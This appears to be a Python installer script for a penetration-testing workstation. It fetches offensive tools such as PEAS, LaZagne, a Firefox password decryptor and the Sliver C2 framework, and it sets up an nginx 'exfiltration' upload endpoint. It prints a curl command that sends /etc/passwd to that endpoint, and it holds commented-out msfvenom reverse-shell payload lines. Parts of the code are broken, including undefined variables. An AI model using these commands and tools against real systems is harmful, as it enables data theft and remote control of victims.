import argparse,os,re,time
from termcolor import colored
from tools import APT_PACKAGES,GITHUBS,PYPI_PACKAGES

# sudo systemctl start postgresql
# <check to ensure the service is running now>
# msfdb init
# ------------------------------#

kit_location = os.getcwd()
homedir = os.environ['HOME']
dldir = homedir + "/Downloads"

# ---- Begin Function declarations -----

def nginx_config():
	# Used to create an NGINX proxy for apache for web exfiltration 
	os.system("sudo mkdir -p /var/www/uploads/Exfil")
	os.system("sudo chown -R www-data:www-data /var/www/uploads/Exfil")
	os.system("sudo cp ./upload.conf /etc/nginx/sites-available/upload.conf")
	if not os.path.exists("/etc/nginx/sites-enabled/upload.conf"):
		os.system("sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/")
	os.system("sudo systemctl restart nginx.service")
	os.system("sudo rm /etc/nginx/sites-enabled/default")
	# Usage
	print(colored("NGINX has been setup. To test the upload, try:","green"))
	print(colored("curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/uploads/Exfil/testfile.txt \n", "green"))


def env_setup():
	""" This is meant to start services, check running processes, etc """
	print(colored("Starting SSH service ...", "blue"))
	os.system("sudo service ssh start")
	# The SMB Server may need some massaging so we have it sharing the desired directory
	#print(colored("Starting SMB Server", "blue"))
	# os.system("impacket-smbserver -smb2support share $(pwd)")

#Consider moving into environment setup
def msfdb_init():
	#TODO: Check and make sure the msfdb is actually up and running (msfdb run)
	os.system('sudo systemctl start postgresql')
	os.system('systemctl status postgresql')
	os.system('sudo msfdb init')
	print("MSF Database Initialized")
	print("Creating msfconsole.rc file")
	os.system(f' cp {kit_location}/msfconsole.rc {homedir}/.msf4/msfconsole.rc')
        print("Here is the status of msfdb:\n")
        os.system('sudo msfdb status')

#Consider moving into environment setup
def neo4j_init():
	#TODO: Grab the port/service information and present to the user
	os.system('sudo mkdir -p /usr/share/neo4j/logs')
	os.system('sudo touch /usr/share/neo4j/logs/neo4j.log')
	os.system('sudo neo4j start')
	print("Neo4j service initialized")


# This whole PEAS mess needs to be fixed later
def peas_download():
	# For the time being - just scrub the PEAS directory and re-obtain
	if os.path.exists(f"{dldir}/PEAS"):
		#Lol, risky
		os.system(f"rm -rf {dldir}/PEAS")
		grab_peas()
	else:
		grab_peas()

def grab_peas():
	#I would like to eventually make the date regex, instead of hardcoded dates...
	# Guess what? I've got a better solution than that. Github provides a way for you to download whatever the latest is like so:
	linpeas_sh = 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh'
	winpeas_bat = 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat'
	winpeas_exe = 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe'
	os.system(f"mkdir {dldir}/PEAS")
	os.system(f"wget {linpeas_sh} -qO {dldir}/PEAS/linpeas.sh ; sudo chmod +x {dldir}/PEAS/linpeas.sh")
	os.system(f"wget {winpeas_bat} -qO {dldir}/PEAS/winpeas.bat")
	os.system(f"wget {winpeas_exe} -qO {dldir}/PEAS/winpeas.exe")


def shell_creation():
	# This grabs the IP address of tun0 and uses it to start generating malicious binaries
	## TODO: Create a method to select what interface you want to use
	# ip_addr = os.popen('ip addr show tun0 | grep "\\<inet\\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()
	# ip_addr = os.popen('ip addr show eth0 | grep "\\<inet\\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()
	# This port is used for malicious binary generation
	# listen_port = 6969
	#ip_addr = os.popen('ip addr show eth0 | grep "\\<inet\\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()
	#listen_port = 6969
	print(f"Interface address is: {ip_addr}")
	print(f"Port being used for shells is {listen_port}")
	print("						   Nice")
	#os.system(f'msfvenom -p linux/x64/shell_reverse_tcp RHOST={ip_addr} LPORT={listen_port} -f elf > /tmp/test.elf')
	#os.system(f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip_addr} LPORT={listen_port} -f elf > /tmp/test.elf')
	#os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip_addr} LPORT={listen_port} -f exe > /tmp/test.exe')
	print("Did I work? doubtful!")

#TODO: Go through the installed tools and make them dynamically executable
#Search through tools and see if there's any requirements.txt - if there is - install them.
# os.system("ln -s /opt/nmapAutomator/nmapAutomator.sh /usr/local/bin/ && chmod +x /opt/nmapAutomator/nmapAutomator.sh")
# sudo ln -s /opt/LinEnum.sh /usr/local/bin/'
# sudo ln -s /opt/.local/bin/one-lin3r /usr/local/bin

def structure_setup():
	"""Meant to create directory structure and organize tools into"""
	#NOTE-> THIS IS TESTED AND WORKS PROPERLY
	DIRS = ["Linux","Windows","ActiveDirectory","C2Frameworks", "Packages"]
	for dir in DIRS:
		if os.path.exists(f"{dldir}/{dir}"):
			print(f"{dir} FOLDER EXISTS")
		else:
			os.mkdir(f"{dldir}/{dir}")
			print(f"created the {dir} directory")

def sublime_install():
	sublime = 'https://download.sublimetext.com/sublime-text_build-3211_amd64.deb'
	os.system(f'wget {sublime} -qO {dldir}/sublime.deb ; sudo dpkg -i {dldir}/sublime.deb')

def vscodium_install():
	# Download the public GPG key for the repo and package if hasn't been downloaded already
	if not os.path.exists('/usr/share/keyrings/vscodium-archive-keyring.gpg'):
		print(colored("[*] Adding VSCodium GPG key to filesystem (within /usr/share/keyrings/)", "green"))
		os.system('wget -qO - https://gitlab.com/paulcarroty/vscodium-deb-rpm-repo/raw/master/pub.gpg | gpg --dearmor | sudo dd of=/usr/share/keyrings/vscodium-archive-keyring.gpg 2>/dev/null')
	else:
		print(colored("[*] VSCodium GPG key already downloaded", "green"))
	# Add the repository if it hasn't been already
	if not os.path.exists('/etc/apt/sources.list.d/vscodium.list'):
		print(colored("[*] Adding VSCodium repository to apt repos in /etc/apt/sources.list.d/", "green"))
		os.system('echo deb [ signed-by=/usr/share/keyrings/vscodium-archive-keyring.gpg ] https://paulcarroty.gitlab.io/vscodium-deb-rpm-repo/debs vscodium main | sudo tee /etc/apt/sources.list.d/vscodium.list 1>/dev/null')
	else:
		print(colored("[*] VSCodium repository already added", "green"))
	# Refresh available packages and install codium
	print(colored("[*] Installing VSCodium from repository", "green"))
	os.system('sudo apt update 2>/dev/null 1>/dev/null && sudo apt install codium -y 2>/dev/null 1>/dev/null')
	print(colored("[*] VSCodium installed", "green"))

def system_update():
	print(colored("Beginning System updates, please wait...", 'blue'))
	sublime_install()
	vscodium_install()
	tool_install()
	tool_update()
	os.system('sudo apt install python3-pip -y')
	os.system('sudo apt update -y')
	os.system('sudo apt upgrade -y')
	os.system('sudo apt autoremove -y')

	print(colored("Starting SSH service ...", "blue"))
	os.system("sudo service ssh start")

	print(colored("Finished SYSTEM setup", 'green'))
	return()

def test():
	print(os.getlogin()) # Interestingly enough - this returns the actual user
	print(f"Kit.py Location: {kit_location}")
	print(os.system(f"whoami")) # This returns as root (since it's run as sudo)
	print("Test Completed")
	return()

def jon():
	print("Doing some work, here's a nice portrait, circa 2022 \n")
	print("""\
   -    \\O
  -     /\\  
 -   __/\\ `	
    `    \\, (o)
^^^^^^^^^^^`^^^^^^^^
Ol' Jon, kickin' them rocks again	\n""")


def tool_install():
	os.chdir(f"{dldir}")
	structure_setup()
	####Temp method to grab lazagne and the old firefox decrypt for python2
	lazagne_exe = 'https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe'
	os.system(f"sudo wget {lazagne_exe} -qO {dldir}/lazagne.exe")
	ff_decrypt_old = 'https://github.com/unode/firefox_decrypt/archive/refs/tags/0.7.0.zip'
	os.system(f"sudo wget {ff_decrypt_old} -qO {dldir}/FirefoxDecrypt_ForPython2")
	#### END TEMP METHOD
	
	def is_repo_installed(repo_url):
		if a_match := re.match(r"https://.+/(.+)\.git", repo_url):
			return os.path.exists(f"./{a_match.group(1)}")
		else:
			print(colored(f'INVALID URL: {repo_url}', 'red'))
			# Returning True here because if the url isn't valid, then we definitely don't want to try installing
			return True

	for git_url in GITHUBS:
		print(f"Checking for local install of: {git_url}")
		if is_repo_installed(git_url):
			print(colored(f"Found in current directory, continuing...\n"))
		else:
			os.system(f"git clone {git_url}")
			print(colored("Repo cloned! Moving on...\n", "green"))
			#return()

	# begin installing pypi & apt packages
	for pkg in APT_PACKAGES:
		os.system(f'sudo apt install {pkg} -y 1>/dev/null')
		os.system('sudo apt install -y 1>/dev/null')
		print(colored(f'APT {pkg} successfully installed by script', "green"))
	for pkg in PYPI_PACKAGES:
		os.system(f'pip3 install {pkg} 1>/dev/null')
		print(colored(f'PYPI {pkg} successfully installed by script', "green"))
	peas_download()
	os.system(f"sudo ln -s {dldir}/nmapAutomator/nmapAutomator.sh /usr/local/bin/ && chmod +x {dldir}/nmapAutomator/nmapAutomator.sh")
	print("tool_install() Completed")
	return True

def tool_update():
	def nmap_update():
		print("Updating nmap script database\n")
		os.system('sudo nmap --script-updatedb 1>/dev/null')
		print(colored('nmap script database updated \n', 'green'))

	def rockyou():
		print("Checking if rockyou has been unzipped...")
		if os.path.isfile('/usr/share/wordlists/rockyou.txt.gz'):
			print("It hasn't been decompressed - decompressing now...\n")
			os.system('sudo gunzip /usr/share/wordlists/rockyou.txt.gz')
		else:
			print(colored("rockyou has already been unzipped \n", 'green'))
			print(colored("Software & Tool updates have been completed!", 'green'))
	print('Updating searchsploit DB....\n')
	os.system('sudo searchsploit -u ')
	print(colored("Finished searchsploit update", 'green'))
	print("Updating locate DB...\n")
	os.system('sudo updatedb')
	print(colored("Finished locate DB update \n", 'green'))
	nmap_update()
	rockyou()
	return True

def c2_sliver_install():
	"""Install sliver and related files
	This is intended to:
		1. Install mingw-w64 as recommended in their [Server Setup in documentation](https://github.com/BishopFox/sliver/wiki/Getting-Started#server-setup)
		2. Create a ~/c2 directory to put downloaded files into
		3. Clone the source repo and wiki repo into their own directories in ~/c2
		4. Download the latest binary releases to ~/c2

	I made a point of wrapping everything in try except blocks since I don't want failure
	of this code to totally grind the script to a halt. Hopefully that helps.
	"""

	print(colored(f'[*] sliver: Installing sliver...', "green"))

	# Try to install mingw-w64 package for more advanced features
	try:
		print(colored(f'[*] sliver: Installing mingw-w64 through apt', "green"))
		os.system(f"sudo apt install -y mingw-w64 2>/dev/null 1>/dev/null")
	except:
		print(colored(f'[!] Failed to install mingw-w64'), "red")
	finally:
		print(colored(f'[*] sliver: Installation of mingw-w64 complete', "green"))

	# Make c2 directory in user's home directory
	try:
		print(colored(f'[*] sliver: Creating c2 directory in {homedir}', "green"))
		os.system(f"mkdir {homedir}/c2")
	except:
		print(colored(f'[!] Failed to create {homedir}/c2', "red"))
	finally:
		print(colored(f'[*] sliver: Directory created', "green"))

	# Clone source repo
	try:
		print(colored(f'[*] sliver: Cloning source and Wiki repos to {homedir}/c2/', "green"))
		os.system(f"git clone --quiet https://github.com/BishopFox/sliver.git {homedir}/c2/sliver.git 2>/dev/null >/dev/null")
		# Wiki for documentation reference
		os.system(f"git clone --quiet https://github.com/BishopFox/sliver.wiki.git {homedir}/c2/sliver.wiki.git 2>/dev/null >/dev/null")
	except:
		print(colored(f'[!] Failed to clone sliver repositories from GitHub', "red"))
	finally:
		print(colored(f'[*] sliver: Repo cloning complete', "green"))

	# Binary releases
	try:
		print(colored(f'[*] sliver: Downloading latest pre-compiled binary releases', "green"))
		os.system(f"wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -qP {homedir}/c2")
		os.system(f"wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux -qP {homedir}/c2")
		os.system(f"wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_windows.exe -qP {homedir}/c2")
	except:
		print(colored(f'[!] Failed to download sliver compiled binaries from GitHub', "red"))
	finally:
		print(colored(f'[*] sliver: Binary download complete', "green"))

	print(colored(f'[*] sliver: Installation complete.', "green"))
	
def hostfilereset():
        os.system('cat hosts.txt | sudo tee /etc/hosts 1>/dev/null')
        print('Your /etc/hosts file has been reset')
